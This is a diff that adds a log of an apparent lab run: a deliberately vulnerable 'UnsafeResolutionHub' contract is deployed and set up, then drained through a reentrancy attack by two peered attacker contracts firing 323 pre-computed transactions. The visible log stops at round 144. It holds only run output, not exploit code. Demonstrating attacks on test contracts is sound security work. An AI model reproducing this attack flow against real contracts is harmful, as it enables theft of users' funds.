@@ -1,0 +1,392 @@
+[2025-10-01 14:46:09.939] [info] - VULNERABLE CONTRACT DEPLOYMENT -
+[2025-10-01 14:46:09.940] [info] Victim wallet balance: 6.40 ETH
+[2025-10-01 14:46:09.940] [info] Deploying UnsafeResolutionHub contract...
+[2025-10-01 14:46:11.713] [info] Deployment tx: 0x45f5bee5aee14284881d6c94d69600727a48ef230f05f65d0dfd1ffa2939d7d9
+[2025-10-01 14:46:11.713] [info] Vulnerable contract address: 0x0e27fa4f61d13bd97ee83e01287ba4421e50615f
+[2025-10-01 14:46:11.713] [info] Adding vulnerable contract to the .env file...
+
+[2025-10-01 14:46:11.994] [info] - ATTACKER CONTRACTS DEPLOYMENT -
+[2025-10-01 14:46:11.995] [info] Attacker wallet balance: 0.05 ETH
+[2025-10-01 14:46:11.995] [info] Deploying attacker contracts...
+[2025-10-01 14:46:13.220] [info] Contract 1: 0xf568c7238b40d0ec0cc1f42e0acb9df041dbc5bb (tx: 0xff322f6fac3e3b0c5893f6bade89177c20d004147c8abcf91faba5f80d297df0)
+[2025-10-01 14:46:13.220] [info] Contract 2: 0x8e6b79d3b6128284720ec711ed2f25a87e2ee0e4 (tx: 0x04eb5a37ee116264ebe57fbb2b231070edb2fb378eb2442f0d626c5ee8f3a7ed)
+[2025-10-01 14:46:13.220] [info] Adding attacker contracts to the .env file...
+[2025-10-01 14:46:15.325] [info] - SET ATTACKER PEERS -
+[2025-10-01 14:46:15.887] [info] setPeer tx 1: 0x3da1907bd607dcc41c0ebf13f3daa38e3e9ae0ea69c16932ca163b05b737a546
+[2025-10-01 14:46:15.887] [info] setPeer tx 2: 0x6465c30247c6dd1e5c4c00e279d85bae7da035a2f5046bede11cb9ff44c73b50
+[2025-10-01 14:46:18.071] [info] Verifying peer addresses...
+[2025-10-01 14:46:18.406] [info] Contract 1 peer: 0x8e6b79d3b6128284720ec711ed2f25a87e2ee0e4 [✓]
+[2025-10-01 14:46:18.407] [info] Contract 2 peer: 0xf568c7238b40d0ec0cc1f42e0acb9df041dbc5bb [✓]
+
+[2025-10-01 14:46:18.433] [info] Setting up Vulnerable contract with exploit prerequisites...
+[2025-10-01 14:46:18.648] [info] - DEPOSIT -
+[2025-10-01 14:46:19.669] [info] Deposit tx: 0xcde55d4844a43704d05d21f0931e7ed64366754a5ceb4975089ccd926d193c6d
+[2025-10-01 14:46:19.752] [info] - CREATE DISPUTES -
+[2025-10-01 14:46:20.397] [info] Dispute nº13658 tx: 0xcc3c8d5fd88f72fad664a9e356cf6f1f4d8f24052c81d42f1b3282ec03f8c34a
+[2025-10-01 14:46:20.397] [info] Dispute nº13661 tx: 0xcb66053ea8a7905a96ae91b6ebd3e489b5f718d4f568049194927006b22cc369
+[2025-10-01 14:46:22.717] [info] - RESOLVE DISPUTES -
+[2025-10-01 14:46:23.201] [info] Resolution for dispute nº13658 tx: 0x5d6cafef1a736a107027c7d3d31ca10a1f104c79c7ae222b3fd69d74c9cdfb27
+[2025-10-01 14:46:23.201] [info] Resolution for dispute nº13661 tx: 0xcd7c42d998c8abc66a293b25877eaf1853acedd5f0e5146717afd433002fc8d3
+[2025-10-01 14:46:25.577] [info] ✓ Dispute nº13658 resolved in favor of the buyer
+[2025-10-01 14:46:25.689] [info] ✓ Dispute nº13661 resolved in favor of the buyer
+[2025-10-01 14:46:25.689] [info] Setup completed successfully!
+
+[2025-10-01 14:46:25.713] [info] Reentrancy attack initial state:
+[2025-10-01 14:46:25.714] [info] Vulnerable contract: 0x0e27fa4f61d13bd97ee83e01287ba4421e50615f
+[2025-10-01 14:46:25.714] [info] Attacker contract 1: 0xf568c7238b40d0ec0cc1f42e0acb9df041dbc5bb
+[2025-10-01 14:46:25.714] [info] Attacker contract 2: 0x8e6b79d3b6128284720ec711ed2f25a87e2ee0e4
+[2025-10-01 14:46:25.957] [info] Initial Vulnerable contract balance: 6.39 ETH
+[2025-10-01 14:46:25.957] [info] Initial Attacker wallet balance: 0.05 ETH
+[2025-10-01 14:46:26.182] [info] Round 0 summary: Vulnerable = 6.39 ETH | AttackerC_1 = 0.00 ETH | AttackerC_2 = 0.00 ETH | Total_stolen = 0.00 ETH
+
+[2025-10-01 14:46:26.352] [info] Calculated required transactions: 320 (+3 added for safety)
+[2025-10-01 14:46:26.524] [info] Pre-computing 323 transactions...
+[2025-10-01 14:46:26.840] [info] - STARTING ATTACK! -
+[2025-10-01 14:46:30.990] [info] Launched 323 transactions in 977.19ms
+[2025-10-01 14:46:30.990] [info] ROUND 1: attack() call in contract 1 | Tx: 0x4fd5ca38dba217543ce400ea7f8b199817313fc64613ec68db3f43eab025adf6
+[2025-10-01 14:46:30.990] [info] ROUND 2: attack() call in contract 2 | Tx: 0xc7b1c75fd967c00ede6a95cfbabdaf1b82a0826ba63dfb189d8f736d7b69369f
+[2025-10-01 14:46:30.990] [info] ROUND 3: attack() call in contract 1 | Tx: 0xd4f2bc331c36ea890722467f43ac9c87391344c4663fb230f17e8f86cb4f4332
+[2025-10-01 14:46:30.990] [info] ROUND 4: attack() call in contract 2 | Tx: 0x0f0802d9497e0a5f4b1509562d09d13fa5eef1fd14d8488e357fd1e2ca38e0a2
+[2025-10-01 14:46:30.990] [info] ROUND 5: attack() call in contract 1 | Tx: 0x41ebf69b62e38f57e791f8c78b398c83615d50b274d06aa87180cb888c55acf6
+[2025-10-01 14:46:30.990] [info] ROUND 6: attack() call in contract 2 | Tx: 0x878c9d9d2958b9d5fe41c26e31489aa1e6f4180865e95ff448778429f2324626
+[2025-10-01 14:46:30.990] [info] ROUND 7: attack() call in contract 1 | Tx: 0x4ffb7923da745392f79fbc20f1d469b06f5a1007c5632e0b7f1586df732af44b
+[2025-10-01 14:46:30.990] [info] ROUND 8: attack() call in contract 2 | Tx: 0xb4003a842463f29c2dcabba59023d8711be603669d21190d064a48d9a723c71c
+[2025-10-01 14:46:30.990] [info] ROUND 9: attack() call in contract 1 | Tx: 0xdfa03c919d711aa27cc7b075becf9ab0d8cbdca9d48bcc058f3b94a8eeb591f6
+[2025-10-01 14:46:30.990] [info] ROUND 10: attack() call in contract 2 | Tx: 0x8ed1f6defb44a439021b7ed84ae47e64d5139b0e9e4fa2e2e4b45fc75949a17e
+[2025-10-01 14:46:30.990] [info] ROUND 11: attack() call in contract 1 | Tx: 0x7a4796768f8ee591ce7db475c63feae4ded3debb40552491f6cc462bb539db5f
+[2025-10-01 14:46:30.990] [info] ROUND 12: attack() call in contract 2 | Tx: 0x61f857b4cbd4eca1a0ff4e4e056ce2d386a13fc63d95643a1a237014761825b2
+[2025-10-01 14:46:30.990] [info] ROUND 13: attack() call in contract 1 | Tx: 0x771e22bbc28d8e002e7a48dbca407734ff2447a99ba9e562babeb415d21afeaa
+[2025-10-01 14:46:30.990] [info] ROUND 14: attack() call in contract 2 | Tx: 0xae0c01f0f2c3f6e97ed71091eea5b3840e2335659bd76b0362639e3a35bd0f36
+[2025-10-01 14:46:30.990] [info] ROUND 15: attack() call in contract 1 | Tx: 0xf20092a763ddb2618248931b5f1c7a926964da55394ccf9529afecef386cd634
+[2025-10-01 14:46:30.990] [info] ROUND 16: attack() call in contract 2 | Tx: 0x1b21f194c7ed0b9c290bbcfba3cee72284d4cb96f407f02bcb7960b2b0a5ca2e
+[2025-10-01 14:46:30.990] [info] ROUND 17: attack() call in contract 1 | Tx: 0x4bae5ec6beac90bd15f8ed93688446f1fd05627572f510c613af38485ae292d1
+[2025-10-01 14:46:30.990] [info] ROUND 18: attack() call in contract 2 | Tx: 0x8473001a4db9c67ddcbdf88d424aff02c81c97dcf493c2841ddc53df7b424225
+[2025-10-01 14:46:30.990] [info] ROUND 19: attack() call in contract 1 | Tx: 0x423479953e4bb06d4d4f37683ee7616c47f1c50456b14ffa846d7a3d73b4fe28
+[2025-10-01 14:46:30.990] [info] ROUND 20: attack() call in contract 2 | Tx: 0x9de789fa408a4369a9ebb9b92f55452126af10e8a7f2eef17f6975d1cdd3a8a0
+[2025-10-01 14:46:30.990] [info] ROUND 21: attack() call in contract 1 | Tx: 0x98f5add736582667df2b627d3ced3f3015ffdff09327138f4ce606d62ed167d6
+[2025-10-01 14:46:30.990] [info] ROUND 22: attack() call in contract 2 | Tx: 0xb433a841bf71cfeb9c2ae02ea4d0b18bed5a09fcf463b043c068e6629cb7b7a4
+[2025-10-01 14:46:30.990] [info] ROUND 23: attack() call in contract 1 | Tx: 0x8f5592be35f934ba240c203ca1ff19d5857cdecf9c3c26ffecf42c209a5a7b62
+[2025-10-01 14:46:30.990] [info] ROUND 24: attack() call in contract 2 | Tx: 0x3a68afc7d63648c3f4e1086363c5e9ca1a3e1b3f501e201201d67fd910d6c14c
+[2025-10-01 14:46:30.990] [info] ROUND 25: attack() call in contract 1 | Tx: 0x9e4bebf74e31cc81078984bdf126de825eb8157e8d7cb3a148d2e471451d7bb5
+[2025-10-01 14:46:30.990] [info] ROUND 26: attack() call in contract 2 | Tx: 0x5d37ceffc6cbd772ac4d0a183ef3ce82aab0e1efc9213da4a9fc89256ea3eaa6
+[2025-10-01 14:46:30.990] [info] ROUND 27: attack() call in contract 1 | Tx: 0x2fd48d7578f6159801a68a10e7a6d16c1106c7f45252b525bbc2088ff1d192d3
+[2025-10-01 14:46:30.990] [info] ROUND 28: attack() call in contract 2 | Tx: 0x91bcef7cba598aeb5fbb8328ddb0f4ec976fad52a8a2d777ffbe39daed07a8c2
+[2025-10-01 14:46:30.990] [info] ROUND 29: attack() call in contract 1 | Tx: 0x4c9526e4416ca4c221b38d562f2d709a45cbe1d3acb036eec4b94cabc808e5e9
+[2025-10-01 14:46:30.991] [info] ROUND 30: attack() call in contract 2 | Tx: 0x701ca7890d671a81478a00a1b999254107f12856c7305c452f8e77d4a5b502a5
+[2025-10-01 14:46:30.991] [info] ROUND 31: attack() call in contract 1 | Tx: 0x0139f6c19b49ca860ff743066048f1f530f7d18a7aa684f2d2c39c70dd18cac1
+[2025-10-01 14:46:30.991] [info] ROUND 32: attack() call in contract 2 | Tx: 0x5fd228d4eccad1edade399f34970fce8ee4f06fa84df20036d74beb62a53360c
+[2025-10-01 14:46:30.991] [info] ROUND 33: attack() call in contract 1 | Tx: 0xdd9bc8698ec879f27a28f95226ba2f4ab887bc2281895d6da1162ea79f873bd5
+[2025-10-01 14:46:30.991] [info] ROUND 34: attack() call in contract 2 | Tx: 0x1030376dd664067709357b78fdc074714c8d9f64c9dbd84594abda6773d3a2fc
+[2025-10-01 14:46:30.991] [info] ROUND 35: attack() call in contract 1 | Tx: 0x0ef6e417ded37e66b3448cdf0345b52f29f4b4b99f3e93c2e988e4c1c98bb374
+[2025-10-01 14:46:30.991] [info] ROUND 36: attack() call in contract 2 | Tx: 0x55ac0a3eb17ad2493979f849887178d9cd9e810548089baf5ef4cc6fe3bcf4bf
+[2025-10-01 14:46:30.991] [info] ROUND 37: attack() call in contract 1 | Tx: 0x5753e378be872d0fd65f086f27b06132d6532d39ac9915a49e5810e81dc91fa6
+[2025-10-01 14:46:30.991] [info] ROUND 38: attack() call in contract 2 | Tx: 0x7757575eb02743cb42a9f93f74554972acaf2acef3c7f20203e7e5a0dff001d5
+[2025-10-01 14:46:30.991] [info] ROUND 39: attack() call in contract 1 | Tx: 0x9712546ee3ee3221150735fe301dbc27223d79603c23f4082d6623e5b3d983b1
+[2025-10-01 14:46:30.991] [info] ROUND 40: attack() call in contract 2 | Tx: 0x61a17905cef87e184a4281b70ed492ca9b2ff451498f1642fbe508574f98c384
+[2025-10-01 14:46:30.991] [info] ROUND 41: attack() call in contract 1 | Tx: 0x4adf361ab3567ab8cfc483f6a32cde42c44590bbfc91fbd8ec5c72bc6016131f
+[2025-10-01 14:46:30.991] [info] ROUND 42: attack() call in contract 2 | Tx: 0x7ce6272c8175dc3c1507aba81e6499d41e3ab5a361c11a1ffaf74d2695905a0e
+[2025-10-01 14:46:30.991] [info] ROUND 43: attack() call in contract 1 | Tx: 0xf61fe0ead54aa9408bc94557a850b921848ce3e8127c445c861850b5d8a5cd3a
+[2025-10-01 14:46:30.991] [info] ROUND 44: attack() call in contract 2 | Tx: 0xb443e2b6e50065528b4aeeed57cc26266b3ce9368875540abc4cf2e296dfee67
+[2025-10-01 14:46:30.991] [info] ROUND 45: attack() call in contract 1 | Tx: 0x9e52249e9dad73b9a10c3071dbd7e2f37c90e745b2d0ce5f6cab64bb9e93c1a2
+[2025-10-01 14:46:30.991] [info] ROUND 46: attack() call in contract 2 | Tx: 0x6544c2a5c3156893de72d619eb4ee2f99a7241524c29b0c6df69760adede4a2a
+[2025-10-01 14:46:30.991] [info] ROUND 47: attack() call in contract 1 | Tx: 0xb74f49539c38e7e4c2eb4a4e40d60d9138e29a319dd05df0ed6e7d46df23fb91
+[2025-10-01 14:46:30.991] [info] ROUND 48: attack() call in contract 2 | Tx: 0x1444adb11569818c5a8c6f6e4e91eca097ab7d2a37f06156ff4af0d2710828ec
+[2025-10-01 14:46:30.991] [info] ROUND 49: attack() call in contract 1 | Tx: 0x78d34d326fd246294d13dccb8fe1d75ce816e00a9c5135e0c785f098d5e586b9
+[2025-10-01 14:46:30.991] [info] ROUND 50: attack() call in contract 2 | Tx: 0xb96edb20be964b7c1589bbcccbc3eb66948c6dc1b2386dfb5165a61c78bbfba8
+[2025-10-01 14:46:30.991] [info] ROUND 51: attack() call in contract 1 | Tx: 0xea162bbfa95dcd5b0c582861eacb802b4fc3e05008dd740a298e1c0cc29b3155
+[2025-10-01 14:46:30.991] [info] ROUND 52: attack() call in contract 2 | Tx: 0xa702bed70aff2af9a987293aaa33146f9cf23720f2ad8568da6a1607179d0cae
+[2025-10-01 14:46:30.991] [info] ROUND 53: attack() call in contract 1 | Tx: 0x413a98c4cc3dbdf591dcf05f87213cb8247ffca0a36e4551b6f8355e331b33e5
+[2025-10-01 14:46:30.991] [info] ROUND 54: attack() call in contract 2 | Tx: 0xb8ef09667fa2cbcae7b16a80bd0d72554080635c75e965f911c8b36a2f754716
+[2025-10-01 14:46:30.991] [info] ROUND 55: attack() call in contract 1 | Tx: 0x193f8811593970c5e43bd653b06694c8208582827f7c1bafbd140e3919eb26f7
+[2025-10-01 14:46:30.991] [info] ROUND 56: attack() call in contract 2 | Tx: 0x3ee52facf18b5f48be6c27e6edaa4963fa3016b6b8311430f856a91cee11a537
+[2025-10-01 14:46:30.991] [info] ROUND 57: attack() call in contract 1 | Tx: 0xa43d9006958e1455a939add16e9af7c28173041a1c650dd1cd9d7065d616550b
+[2025-10-01 14:46:30.991] [info] ROUND 58: attack() call in contract 2 | Tx: 0x01531fdd66f2edd6a3e3315a5f3b01146397172ac3a212665f9125f5fa32c40f
+[2025-10-01 14:46:30.991] [info] ROUND 59: attack() call in contract 1 | Tx: 0xe2ae8b50ec6c5cd4eaf8f05418136dbd7502bf1e705f0fcc4d04b1206a1c2f01
+[2025-10-01 14:46:30.991] [info] ROUND 60: attack() call in contract 2 | Tx: 0x1c168ba47e16f06d068e1ec24499d5584f2ddeefceb11b765fb0d4b30cebbe15
+[2025-10-01 14:46:30.991] [info] ROUND 61: attack() call in contract 1 | Tx: 0xc08ee0cc6b88c5b4ac7883afc3df15c8ce5721fbd03029bf122e78010fda09a7
+[2025-10-01 14:46:30.991] [info] ROUND 62: attack() call in contract 2 | Tx: 0x179a4fc072b4e7e34991dec805e11000cb9aec402dd660fe01f2e258555e6acc
+[2025-10-01 14:46:30.991] [info] ROUND 63: attack() call in contract 1 | Tx: 0xfda78054c246dbd68bbbc0695ece383cb71c88a8c69e2d679ea5c5350e87b51a
+[2025-10-01 14:46:30.991] [info] ROUND 64: attack() call in contract 2 | Tx: 0x690b7da66465577d2d3e90341182c1e4aa72b9b9ea74b521abfcb444511f1924
+[2025-10-01 14:46:30.991] [info] ROUND 65: attack() call in contract 1 | Tx: 0x6e8aa7b141f7d7660b746fe5ed550e4e87f4c6ceb37b6ddc639e6ccdb845b0b2
+[2025-10-01 14:46:30.991] [info] ROUND 66: attack() call in contract 2 | Tx: 0x01d456108c50c964758afad265b1fc78092602fa72b34e47a770da79cd51bc27
+[2025-10-01 14:46:30.991] [info] ROUND 67: attack() call in contract 1 | Tx: 0x59fcb6c17fc4c3ee4d337d726529001b48aba158e1c31e20c56b30d05593d5bf
+[2025-10-01 14:46:30.991] [info] ROUND 68: attack() call in contract 2 | Tx: 0x42d5265d1cbe27bbb398f21f7c1fd673a9a0218bd2981d7c114e3ac0168643dc
+[2025-10-01 14:46:30.991] [info] ROUND 69: attack() call in contract 1 | Tx: 0xe001aa3efafbdfabf4d6c12ad35e01aa4a6e2b5d7872c8525e074dc16e2e24c7
+[2025-10-01 14:46:30.991] [info] ROUND 70: attack() call in contract 2 | Tx: 0x7d97b162d6931338c12179f150031068c222e7fe78a35249d6f9a02d75ffa02d
+[2025-10-01 14:46:30.991] [info] ROUND 71: attack() call in contract 1 | Tx: 0x4307a27e6b9f88aeb719d0c173690e53590427e957c7598b7459ff6e0ac4c50a
+[2025-10-01 14:46:30.991] [info] ROUND 72: attack() call in contract 2 | Tx: 0x193ba93c52a4463bb9ada3ef1b73c3ad41083332c1d5eae13450b1ccd98fd798
+[2025-10-01 14:46:30.991] [info] ROUND 73: attack() call in contract 1 | Tx: 0x41e5fba476cf38ae6f91aa6a77c6e50cc5ebfd7a0214a104c91c1734816d82a7
+[2025-10-01 14:46:30.991] [info] ROUND 74: attack() call in contract 2 | Tx: 0x0d5f7f1e3f2c3fdc61d676cb07e55ece02726207ad6b820d0caa5113d789c419
+[2025-10-01 14:46:30.991] [info] ROUND 75: attack() call in contract 1 | Tx: 0x75054db0055b3b63d9860d682402535b778fa10b6ab9c179a9a214550ad1eb0d
+[2025-10-01 14:46:30.991] [info] ROUND 76: attack() call in contract 2 | Tx: 0x83e47d53a77380b320f1076616ba90170f9b1607774a3a07f360a2d8218b4275
+[2025-10-01 14:46:30.991] [info] ROUND 77: attack() call in contract 1 | Tx: 0x98254790fd50f6aa00841a1faa664d52de2faf21863c2faa7286b9b9109493b3
+[2025-10-01 14:46:30.991] [info] ROUND 78: attack() call in contract 2 | Tx: 0xef6a79a3d8241304126e59aeec14fd80312c5a6b28d371544b8b009b83663600
+[2025-10-01 14:46:30.991] [info] ROUND 79: attack() call in contract 1 | Tx: 0x56cf13529efc22ef039592109825b2462d84cb39e89109f48f22e7b98af43288
+[2025-10-01 14:46:30.991] [info] ROUND 80: attack() call in contract 2 | Tx: 0x545a265dd05700cd63b85f04e7fc22806bea57df3f1056e2cb1a501f4abeb5de
+[2025-10-01 14:46:30.991] [info] ROUND 81: attack() call in contract 1 | Tx: 0xa28974ce7fa35d489ea9bab1ed44f7ea5b2c0fb1168845830d6d06aa7a291d33
+[2025-10-01 14:46:30.991] [info] ROUND 82: attack() call in contract 2 | Tx: 0x54e5cb4075e61e68e65ef2b3dfdb6ace69311a33147fa61256427224fd79160e
+[2025-10-01 14:46:30.991] [info] ROUND 83: attack() call in contract 1 | Tx: 0x310dc0c1cde8903c573d5bf5802c8d225c17d97d0e5ddd43ab73fabbb7ded53d
+[2025-10-01 14:46:30.991] [info] ROUND 84: attack() call in contract 2 | Tx: 0x4a58913f2529e232d961e402782a2e9fd4bc737f6146c2bbf060cdb316a7d63b
+[2025-10-01 14:46:30.991] [info] ROUND 85: attack() call in contract 1 | Tx: 0x96b8c6b8c862286d4a071809c4f7d0064374a5ea2f3230241daf7c571eb6651f
+[2025-10-01 14:46:30.991] [info] ROUND 86: attack() call in contract 2 | Tx: 0x4fa7e8a7338d1f9d5bdd14fb5180c6560065071b5623054c7c1bfdd9c08cb172
+[2025-10-01 14:46:30.991] [info] ROUND 87: attack() call in contract 1 | Tx: 0x614376f44a707f2d1e0994bbafe0668c4edfff4d5cd7156ff0f20419cc670317
+[2025-10-01 14:46:30.991] [info] ROUND 88: attack() call in contract 2 | Tx: 0x6df0cbd10bdffcde6562801e21292bb2ccd45b8a2e8a48438ecbc64ddb264d78
+[2025-10-01 14:46:30.991] [info] ROUND 89: attack() call in contract 1 | Tx: 0x255312e61a1f3633a59d19dc09bfbebe42609840f018e15f53fa04272d329e61
+[2025-10-01 14:46:30.991] [info] ROUND 90: attack() call in contract 2 | Tx: 0xdcdb50f5c3ae0be6c33ae4a8031d0538f2c01351ba831957f86cd8e243083133
+[2025-10-01 14:46:30.991] [info] ROUND 91: attack() call in contract 1 | Tx: 0x0abf1b20ca0591063b4e4e001244bac5d7df11bcca85994d21e0c7f063c03576
+[2025-10-01 14:46:30.991] [info] ROUND 92: attack() call in contract 2 | Tx: 0x5cecbe3e2628acbffa8b73438a962f2ed503e7f425f3b1b89e05841c96ef38a4
+[2025-10-01 14:46:30.991] [info] ROUND 93: attack() call in contract 1 | Tx: 0x73782a2d718bdb2840bd8ebe9cd20833dcde440f2260d841ec24e3190620ab67
+[2025-10-01 14:46:30.991] [info] ROUND 94: attack() call in contract 2 | Tx: 0xd3d27c973dd39849b41220e4d0d3d373434cf5e15a0750f9bd7baa1ea2c139a4
+[2025-10-01 14:46:30.991] [info] ROUND 95: attack() call in contract 1 | Tx: 0x984603775745785edc1f661ce7dee57bb0a7504516e3eda7bf2d0053f299ef3e
+[2025-10-01 14:46:30.991] [info] ROUND 96: attack() call in contract 2 | Tx: 0x554fe6859271f937f02d102bd6c37fc2469918cff660d669ab130198e59bc49e
+[2025-10-01 14:46:30.991] [info] ROUND 97: attack() call in contract 1 | Tx: 0x510423372765be18a6c0b7f236a341678a6d15fe860b40a554e53dc5b592cd0f
+[2025-10-01 14:46:30.991] [info] ROUND 98: attack() call in contract 2 | Tx: 0xdd6ebb72f69c9f55ca9d34f19aad232b7f21d55d5e4e30a1591e7715b0b3323a
+[2025-10-01 14:46:30.991] [info] ROUND 99: attack() call in contract 1 | Tx: 0x8744f91065a9b6e570b79161ecc37b2e89f57dcdfb1e92520346846b5598f524
+[2025-10-01 14:46:30.991] [info] ROUND 100: attack() call in contract 2 | Tx: 0xbbea8c1506c40baa801c21153e59a1b6d73459954fe4d743aeaf778e42a82eef
+[2025-10-01 14:46:30.991] [info] ROUND 101: attack() call in contract 1 | Tx: 0xbdb766a2aaeb08b0a772e1191e43cee509a0cfa153b9780e1c417a9efb7fc135
+[2025-10-01 14:46:30.991] [info] ROUND 102: attack() call in contract 2 | Tx: 0xf2660915563269a91f353256090a32b86c0a5fb296f6e4d7f260330f866e7dc1
+[2025-10-01 14:46:30.991] [info] ROUND 103: attack() call in contract 1 | Tx: 0x67487853ad766d5b898f2949931b8134dbaf35a97edf9daf46e25034089c3ef4
+[2025-10-01 14:46:30.991] [info] ROUND 104: attack() call in contract 2 | Tx: 0x5f32d85b31216c010e2cf71986f09a4117ed6096fdbb67af241358f86ff9b5ea
+[2025-10-01 14:46:30.991] [info] ROUND 105: attack() call in contract 1 | Tx: 0x802253cfdf32aff9563ada86194c9c2ff0a4d33ff8f0d598620a875c591fdf6e
+[2025-10-01 14:46:30.991] [info] ROUND 106: attack() call in contract 2 | Tx: 0x371430433e50a77d4e60c19b58b01b015ae7204aa2dd90fa817e8441b2825ad9
+[2025-10-01 14:46:30.991] [info] ROUND 107: attack() call in contract 1 | Tx: 0xb3399427ac82f08141d1783e71a0e303edc40f6897a0f27246d72fd4f565b027
+[2025-10-01 14:46:30.991] [info] ROUND 108: attack() call in contract 2 | Tx: 0x2799bc4bd2e46465a2cdce9ec2af5ab5c1748539e0df5a60a7e4a118564f4fd4
+[2025-10-01 14:46:30.991] [info] ROUND 109: attack() call in contract 1 | Tx: 0xec669154791f7fbbcf769f7375ef8c3f633e98fbf99719d25fff29dd5457f7f6
+[2025-10-01 14:46:30.991] [info] ROUND 110: attack() call in contract 2 | Tx: 0x1c8bc67539ab184cdb1ca3b26db3e852ca8d4550ba43496a05432c93b35abf2b
+[2025-10-01 14:46:30.991] [info] ROUND 111: attack() call in contract 1 | Tx: 0x346e497f75a48902c69840205e2dd47909981a7b9ea097f1bef6f0d434812b39
+[2025-10-01 14:46:30.991] [info] ROUND 112: attack() call in contract 2 | Tx: 0x542c866c7139679cd3f1837a7c6453440e1e85f20da5539b49b2a1f9e53afdc7
+[2025-10-01 14:46:30.991] [info] ROUND 113: attack() call in contract 1 | Tx: 0x5b776d56046f223de2295f7f8ff49f94f34c9b134b30d2851e3eb193e2bf858b
+[2025-10-01 14:46:30.991] [info] ROUND 114: attack() call in contract 2 | Tx: 0xcfcfc48adc59d872ca5b03cbc35149064c81d6bf7803fd577f9ef553ff7b7aa2
+[2025-10-01 14:46:30.991] [info] ROUND 115: attack() call in contract 1 | Tx: 0x956782882f723107d731ae002942124104fc691329ac4001cff2cbacfac06055
+[2025-10-01 14:46:30.991] [info] ROUND 116: attack() call in contract 2 | Tx: 0x0b5d8b55b83a015d472d53f9a501aa7493479218ac8b563d8459853382712eaf
+[2025-10-01 14:46:30.991] [info] ROUND 117: attack() call in contract 1 | Tx: 0xc89ca08437c09d87c95fbd3de17c900f9cacab0df71b47121270c9d40d6f9859
+[2025-10-01 14:46:30.991] [info] ROUND 118: attack() call in contract 2 | Tx: 0x31961c745ccc4e128b825e9b23169060b9ba1efd90be9d299cadb395addbf68c
+[2025-10-01 14:46:30.991] [info] ROUND 119: attack() call in contract 1 | Tx: 0x1898b70364f62bd8b251efbe008848ff187102beed6e0332cd368c957c4853f1
+[2025-10-01 14:46:30.991] [info] ROUND 120: attack() call in contract 2 | Tx: 0x6dd28502b4ab9ba40d1dde88f13bef4d1374223aee1565503a4f9c4c3c392cc9
+[2025-10-01 14:46:30.991] [info] ROUND 121: attack() call in contract 1 | Tx: 0x119307123fc562476c508b37f693e32101dc8c0f41f1c620248d91f687129555
+[2025-10-01 14:46:30.991] [info] ROUND 122: attack() call in contract 2 | Tx: 0xc9c96d0590a69faa2c64bc9b4a0f5c2269abaac943e3ba9524e1c397753ff84a
+[2025-10-01 14:46:30.991] [info] ROUND 123: attack() call in contract 1 | Tx: 0x0f7847f3fe6566fe1dd9e30cde333806aaef245cb356be60d283e9a6ba51713e
+[2025-10-01 14:46:30.991] [info] ROUND 124: attack() call in contract 2 | Tx: 0xd1df8cb894930f2d37824a68b69abd5805366d8cc8a129b9251f3948a2a983de
+[2025-10-01 14:46:30.991] [info] ROUND 125: attack() call in contract 1 | Tx: 0x4af9250143da7f175c8f9ee93858331af044bc3074f95ad427ab96ac2592ba7a
+[2025-10-01 14:46:30.991] [info] ROUND 126: attack() call in contract 2 | Tx: 0x1285fd697a27b7717f814b09e5223897f321e19dca73d6acaa9804cf2eeeaedb
+[2025-10-01 14:46:30.991] [info] ROUND 127: attack() call in contract 1 | Tx: 0x0d475bedc7737d9082519c963494070c2914b5739ecbb2e49efee3d663560695
+[2025-10-01 14:46:30.991] [info] ROUND 128: attack() call in contract 2 | Tx: 0x3114ebbb42a65ab5205f0d4ff65a53e815734ec987389cb4a0b3183bbb76cca3
+[2025-10-01 14:46:30.991] [info] ROUND 129: attack() call in contract 1 | Tx: 0x8029e6af7d3ea96a3b10fc11b26e774d8fa295b12f0a9c57c43dce9fc6a382eb
+[2025-10-01 14:46:30.991] [info] ROUND 130: attack() call in contract 2 | Tx: 0x7231566fcfbdafb4e63b116bef3da1960aec709c22299a4b6200c7a6f82882be
+[2025-10-01 14:46:30.991] [info] ROUND 131: attack() call in contract 1 | Tx: 0x852bfc9c0bdeea00dcf8fe36238e2e3d0284d5fbf5ab401bec27ab0711484418
+[2025-10-01 14:46:30.991] [info] ROUND 132: attack() call in contract 2 | Tx: 0x618eff62f735c4fef5bef86e11e2662f160fe9a5a429572166868deb497dfa79
+[2025-10-01 14:46:30.991] [info] ROUND 133: attack() call in contract 1 | Tx: 0xbd7ddadd8f96fc5b15994ca2bf1417ff5bdd60065589b076256d54810cd2946c
+[2025-10-01 14:46:30.991] [info] ROUND 134: attack() call in contract 2 | Tx: 0xf8a842b5b49b43c1e71d56e7ff011f38ea6c1bc108d89cfbccaeaf85f95b1504
+[2025-10-01 14:46:30.991] [info] ROUND 135: attack() call in contract 1 | Tx: 0x25a63f78782ebf409c5a95a2c8d72a35665e6a268637af4984cf36f13becb444
+[2025-10-01 14:46:30.991] [info] ROUND 136: attack() call in contract 2 | Tx: 0x9280c2f7ec23a7bc61524925a8fd5399b59afb85b7aa22ecc161a6b16dc337dc
+[2025-10-01 14:46:30.991] [info] ROUND 137: attack() call in contract 1 | Tx: 0x4d2a0736d3a740599ccd950f947d88b38dee683d1f25b88a92a15d4b7404bdc2
+[2025-10-01 14:46:30.991] [info] ROUND 138: attack() call in contract 2 | Tx: 0xcf9af292bf24a2aa081986d8f08f36fa8bb5adf876d4098d584133f00b99d80d
+[2025-10-01 14:46:30.991] [info] ROUND 139: attack() call in contract 1 | Tx: 0xc511a81ec238e56082088b206b337e7fa6e4172ec4abc10165fc681817bf6906
+[2025-10-01 14:46:30.992] [info] ROUND 140: attack() call in contract 2 | Tx: 0xc227228f745ef97845a093d4f010585dd8e5afab4e39ad89f3a794039dcf49b4
+[2025-10-01 14:46:30.992] [info] ROUND 141: attack() call in contract 1 | Tx: 0x3973baaa8f772178d2ea8ba67c157186f462fe565e73a21f5c8b3e62a371928c
+[2025-10-01 14:46:30.992] [info] ROUND 142: attack() call in contract 2 | Tx: 0x64a8dd59b75f96348e260683e69e2ec4d688030ee8e0d35c1e5cb18c0380be7e
+[2025-10-01 14:46:30.992] [info] ROUND 143: attack() call in contract 1 | Tx: 0x2861685eadea3ad6d7259135836b04941dced734d6923d59070d99bb8e7515dc
+[2025-10-01 14:46:30.992] [info] ROUND 144: attack() call in contract 2 | Tx: 0x0ccbe985692a22d7396a905f7a752d150582677237bf37d7b3fc99a30d5f4543
